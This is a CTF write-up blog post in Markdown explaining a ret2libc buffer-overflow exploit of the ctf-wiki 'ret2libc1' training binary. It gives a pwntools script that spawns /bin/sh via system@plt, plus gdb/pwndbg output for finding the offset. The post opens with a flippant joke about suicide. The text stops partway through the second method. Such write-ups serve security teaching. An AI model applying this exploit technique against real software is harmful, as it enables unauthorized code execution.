---
title: 「PWN」BasicROP　-　Ret2Libc
description: 文章由作者nova撰写，主要分享了他在进行CTF（Capture The Flag）比赛中学习并应用ROP（Return-Oriented
  Programming）技术中的Ret2Libc攻击方法的经验。文章详细介绍了三个不同难度的Ret2Libc攻击实例，并提供了解决每个实例的方法和代码示例。
pubDate: 2021-12-12
tags:
- CTF
- Pwn
authors:
- nova

---
# Basic ROP - Ret2libc

After some painful reflections, failing to solve a few problems in a row, and receiving some guidance from zbr, I decided to commit suicide.

Enough.

{/* truncate */}

## ret2libc1

Check the protections, no Canary and no PIE, 32-bit ELF.

![image](https://oss.nova.gal/img/image-20211212102309182.png)

In the string list, you can see both `system` and `/bin/sh`.

![image](https://oss.nova.gal/img/image-20211212102632678.png)

Simply construct a function to overwrite the return address.

```python
from pwn import *

context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

sh = process("./ret2libc1")
elf = ELF("./ret2libc1")

system_addr = 0x8048460  # plt
# system_addr = elf.plt["system"]  # it works as well
binsh_addr = 0x08048720
sh.recvuntil(b"RET2LIBC >_<\n")

payload = b'A'*(0x6c+0x04) + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

Some key points:

- The address of `system` should be taken from the PLT table, not the one seen in the string. Refer to PLT / GOT - Dynamic Linking.

- In this challenge, in IDA you can see `char s[100]; // [esp+1Ch] [ebp-64h] BYREF`, which indicates that the distance from ebp is `0x64 bytes`, but in reality it is `0x6c bytes`.

  - Here's the solution provided by Mark:

    ![image](https://oss.nova.gal/img/image-20211212105927823.png)

  - How to calculate the offset? Here are two methods using gdb and pwndbg:

    - gdb

      - Find the address of `call _gets`, you can see that `s` is right above it.

      ![image](https://oss.nova.gal/img/image-20211212110511113.png)

      - Set a breakpoint at `0x0804867B`

        ```shell
        gdb ./ret2libc
        b *0x0804867E
        r
        ```

        ```shell
        Breakpoint 2, 0x0804867e in main () at ret2libc1.c:27
        27	in ret2libc1.c
        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        ──────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
         EAX  0xffffcf3c ◂— 0x0
         EBX  0x0
         ECX  0xffffffff
         EDX  0xffffffff
         EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         EBP  0xffffcfa8 ◂— 0x0
         ESP  0xffffcf20 —▸ 0xffffcf3c ◂— 0x0
        *EIP  0x804867e (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8
        ────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────
           0x804867b <main+99>              mov    dword ptr [esp], eax
         ► 0x804867e <main+102>             call   gets@plt                     <gets@plt>
                arg[0]: 0xffffcf3c ◂— 0x0
                arg[1]: 0x0
                arg[2]: 0x1
                arg[3]: 0x0

           0x8048683 <main+107>             mov    eax, 0
           0x8048688 <main+112>             leave
           0x8048689 <main+113>             ret

           0x804868a                        nop
           0x804868c                        nop
           0x804868e                        nop
           0x8048690 <__libc_csu_init>      push   ebp
           0x8048691 <__libc_csu_init+1>    push   edi
           0x8048692 <__libc_csu_init+2>    xor    edi, edi
        ────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
        00:0000│ esp 0xffffcf20 —▸ 0xffffcf3c ◂— 0x0
        01:0004│     0xffffcf24 ◂— 0x0
        02:0008│     0xffffcf28 ◂— 0x1
        03:000c│     0xffffcf2c ◂— 0x0
        ... ↓        2 skipped
        06:0018│     0xffffcf38 —▸ 0xf7ffd000 ◂— 0x2bf24
        07:001c│ eax 0xffffcf3c ◂— 0x0
        ──────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
         ► f 0 0x804867e main+102
           f 1 0xf7de7ee5 __libc_start_main+245
           f 2 0x80484f1 _start+33
        ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        ```

        From the `[REGISTERS]` section, we can see that the address of `s` is `0xffffcf3c`, and the offset from ESP address `0xffffcf20` is `0x1c`, which is consistent with what we saw in IDA. Additionally, note the EBP address `0xffffcfa8`, and by simple addition and subtraction, we can calculate the offset between EBP and ESP as `0x88`, which means the offset between EBP and `s` is `0x6c`, contradicting what we see in IDA that it is `[ebp-64h]`.

    - pwndbg

      I am currently not familiar with this method. I will check the pwndbg documents later.

      - First, generate some junk characters

        ```shell
        pwndbg> cyclic 200
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
        ```

      - Run the program again and input the generated junk characters

        ```shell
        pwndbg> r
        Starting program: /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc1
        RET2LIBC >_<
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

        Program received signal SIGSEGV, Segmentation fault.
        0x62616164 in ?? ()
        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        ─────────────────────────────────────────────────────────────────
        ```

{/* AI */}
